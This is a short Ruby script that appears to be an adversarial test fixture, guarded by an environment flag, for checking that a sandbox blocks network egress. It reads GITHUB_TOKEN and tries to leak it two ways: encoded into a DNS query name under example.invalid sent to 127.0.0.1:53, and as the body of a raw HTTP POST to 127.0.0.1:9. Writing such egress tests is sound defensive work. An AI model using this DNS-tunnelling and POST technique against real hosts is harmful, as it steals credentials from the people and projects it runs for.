# frozen_string_literal: true

raise "run only in the disposable fixture harness" unless ENV["BONEBED_ADVERSARIAL_FIXTURE"] == "1"

require "socket"
name = "#{ENV.fetch("GITHUB_TOKEN")}.example.invalid"
question = name.split(".").map { |part| [part.bytesize].pack("C") + part }.join + "\0"
packet = [1, 0x100, 1, 0, 0, 0].pack("n6") + question + [1, 1].pack("n2")
begin
  UDPSocket.new.send(packet, 0, "127.0.0.1", 53)
rescue Errno::ENETUNREACH
  puts "dns blocked"
end
begin
  socket = TCPSocket.new("127.0.0.1", 9)
  body = ENV.fetch("GITHUB_TOKEN")
  socket.write("POST / HTTP/1.1\r\nHost: #{name}\r\nContent-Length: #{body.bytesize}\r\n\r\n#{body}")
  socket.close
rescue Errno::ENETUNREACH, Errno::ECONNREFUSED
  puts "http blocked"
end
